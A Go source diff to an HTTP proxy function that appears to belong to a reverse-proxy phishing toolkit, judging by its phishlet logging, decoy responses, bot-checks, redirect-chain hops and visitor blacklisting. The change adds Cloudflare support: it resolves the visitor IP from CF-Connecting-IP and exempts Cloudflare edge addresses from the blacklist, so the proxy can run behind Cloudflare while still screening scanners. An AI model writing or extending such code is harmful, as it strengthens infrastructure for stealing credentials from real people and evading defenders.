@@ -169,18 +169,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
-			// handle ip blacklist
-			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]
-
-			// handle proxy headers
-			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
-			for _, h := range proxyHeaders {
-				origin_ip := req.Header.Get(h)
-				if origin_ip != "" {
-					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
-					break
-				}
-			}
+			// Resolve real visitor IP — honours CF-Connecting-IP when Cloudflare
+			// mode is enabled and the socket peer is a known Cloudflare edge node.
+			from_ip := GetRealIP(req, p.cfg.GetCloudflareMode())
 
 			// Multi-layer redirect chain hops (/c/<token>).
 			// Must run before bot-check so chain links work for real users.
@@ -202,7 +193,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return DecoyResponse(req)
 				}
 				if p.cfg.GetBlacklistMode() == "all" {
-					if !p.bl.IsWhitelisted(from_ip) {
+					if !p.bl.IsWhitelisted(from_ip) && !IsCloudflareIP(from_ip) {
 						err := p.bl.AddIP(from_ip)
 						if p.bl.IsVerbose() {
 							if err != nil {
@@ -369,7 +360,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 											if p.cfg.GetBlacklistMode() == "unauth" {
-												if !p.bl.IsWhitelisted(from_ip) {
+												if !p.bl.IsWhitelisted(from_ip) && !IsCloudflareIP(from_ip) {
 													err := p.bl.AddIP(from_ip)
 													if p.bl.IsVerbose() {
 														if err != nil {
@@ -456,7 +447,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 
 								if p.cfg.GetBlacklistMode() == "unauth" {
-									if !p.bl.IsWhitelisted(from_ip) {
+									if !p.bl.IsWhitelisted(from_ip) && !IsCloudflareIP(from_ip) {
 										err := p.bl.AddIP(from_ip)
 										if p.bl.IsVerbose() {
 											if err != nil {
